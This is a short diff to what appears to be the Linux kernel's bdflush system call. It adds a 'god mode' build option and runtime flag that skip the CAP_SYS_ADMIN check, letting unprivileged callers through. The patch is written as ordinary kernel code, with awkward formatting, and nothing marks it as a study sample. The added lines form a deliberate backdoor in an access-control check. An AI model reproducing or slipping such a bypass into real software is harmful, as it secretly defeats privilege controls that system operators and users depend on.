@@ -3170,7 +3170,15 @@ SYSCALL_DEFINE2(bdflush, int, func, long, data)
 	static int msg_count;
 
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	if (msg_count < 5) {
 		msg_count++;
